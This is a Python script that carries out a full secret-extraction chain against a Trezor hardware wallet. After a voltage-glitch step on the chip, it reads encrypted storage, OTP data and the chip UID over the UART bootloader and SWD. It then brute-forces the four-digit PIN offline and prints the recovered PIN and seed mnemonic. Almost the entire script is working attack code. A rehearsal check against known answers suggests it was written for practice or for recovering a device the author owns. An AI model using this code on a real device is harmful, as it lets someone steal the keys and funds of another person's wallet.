#!/usr/bin/env python3
"""Full recovery chain over the UART bootloader (RDP0 - i.e. after the
stage-2 glitch succeeds on the locked chip, or on the practice twin).

One serial session, no partial-handshake probes:
  [1] sync                          -> ACK (refused = still RDP1)
  [2] dump 16 KB  @ 0x08008000      -> storage_dump.bin
  [3] dump 12 B   @ 0x1FFF7A10      -> uid.hex       (hardware salt part)
  [4] dump 32 B   @ 0x1FFF7860      -> otp3.hex      (OTP block 3)
  [5] offline brute-force PIN 0000-9999 + decrypt via decrypt_storage.py

Prints recovered PIN + mnemonic. Passphrase is never stored in Trezor
flash, so it is not part of this recovery.
"""
import functools
import json
import subprocess
import sys
import time

import serial
import chipwhisperer as cw

sys.path.insert(0, '/home/tdaly/trezor-btc/storage-sim')
from serialfind import find_ftdi  # noqa: E402

STORAGE_ADDR, STORAGE_LEN = 0x08008000, 0x1000
UID_ADDR, UID_LEN = 0x1FFF7A10, 12
OTP3_ADDR, OTP3_LEN = 0x1FFF7860, 32
CANARY = b'NRC2'


def sync_bootloader(ser, tries=10):
    for _ in range(tries):
        ser.reset_input_buffer()
        ser.write(b'\x7f')
        r = ser.read(1)
        if r and r[0] == 0x79:
            return True
        time.sleep(0.05)
    return False


def read_mem(ser, addr, n):
    """One complete Read Memory transaction (acks are 1 byte)."""
    ab = addr.to_bytes(4, 'big')
    ser.write(b'\x11\xee')
    if ser.read(1) != b'\x79':
        return None
    ser.write(ab + bytes([functools.reduce(int.__xor__, ab)]))
    if ser.read(1) != b'\x79':
        return None
    ser.write(bytes([n - 1, (n - 1) ^ 0xFF]))
    r = ser.read(n + 1)
    if not r or len(r) != n + 1 or r[0] != 0x79:
        return None
    return r[1:n + 1]


def dump_region(ser, addr, n, chunk=255):
    got = b''
    while len(got) < n:
        c = read_mem(ser, addr + len(got), min(chunk, n - len(got)))
        if c is None:
            if ser.read(1) or True:   # drain
                pass
            if not sync_bootloader(ser):
                raise RuntimeError(f'read failed at {addr + len(got):#010x}')
            continue
        got += c
    return got


def main():
    s = cw.scope()
    s.io.target_pwr = True
    time.sleep(2)
    s.io.target_pwr = False
    time.sleep(2)
    s.io.target_pwr = True
    time.sleep(3)
    s.dis()
    del s
    time.sleep(1)

    ser = serial.Serial(find_ftdi(), 115200, bytesize=8, parity='E',
                        stopbits=1, timeout=1.5)
    if not sync_bootloader(ser):
        print('NO SYNC - bootloader not alive (or RDP1 locked with no '
              'glitch yet)')
        sys.exit(1)
    print('[1] sync 0x79 OK')

    storage = dump_region(ser, STORAGE_ADDR, STORAGE_LEN)
    print(f'[2] storage dumped: {len(storage)} B, '
          f'head {storage[:8].hex()}')
    if not storage.startswith(CANARY):
        print('    !! no NRC2 magic - region empty or wrong offset')
    with open('storage_dump.bin', 'wb') as f:
        f.write(storage)

    otp3 = dump_region(ser, OTP3_ADDR, OTP3_LEN)
    print(f'[4] OTP3 (0x{OTP3_ADDR:08X}): {otp3.hex()}')
    with open('otp3.hex', 'w') as f:
        f.write(otp3.hex() if any(b != 0xFF for b in otp3) else '')
    ser.close()

    # UID is refused by the bootloader over UART - read via SWD instead
    from swd.stlink import Stlink
    st = Stlink(swd_frequency=480000)
    uid = bytes(st.read_mem8(UID_ADDR, UID_LEN))
    del st
    print(f'[3b] UID via SWD (0x{UID_ADDR:08X}): {uid.hex()}')
    with open('uid.hex', 'w') as f:
        f.write(uid.hex())

    # offline brute-force + decrypt
    cmd = ['/home/tdaly/.cwvenv/bin/python', 'decrypt_storage.py',
           'storage_dump.bin', '--brute', '0000-9999', '--uid', uid.hex()]
    if any(b != 0xFF for b in otp3):
        cmd += ['--otp3', otp3.hex()]
    print('[5] PIN brute-force (0000-9999) + decrypt ...')
    out = subprocess.run(cmd, capture_output=True, text=True)
    sys.stdout.write(out.stdout)
    if out.stderr:
        sys.stdout.write(out.stderr)
    # rehearsal-only ground truth check
    try:
        ka = json.load(open('known-answer.json'))
        found = [l for l in out.stdout.splitlines()
                 if 'PIN FOUND' in l or l.startswith('entry 0102')]
        text = '\n'.join(found)
        ok = (ka['pin'] in text and
              ka['mnemonic'].split()[0] in text for _ in [0])
        line = next((l for l in found if l.startswith('entry 0102')), '')
        mn_ok = line.lstrip('entry 0102: ').strip() == ka['mnemonic']
        pin_ok = f"PIN FOUND: {ka['pin']}" in out.stdout
        print('\nREHEARSAL CHECK vs known-answer.json: PIN '
              + ('MATCH' if pin_ok else 'NO')
              + ', mnemonic ' + ('MATCH' if mn_ok else 'NO'))
    except FileNotFoundError:
        pass
    sys.exit(out.returncode)


if __name__ == '__main__':
    main()
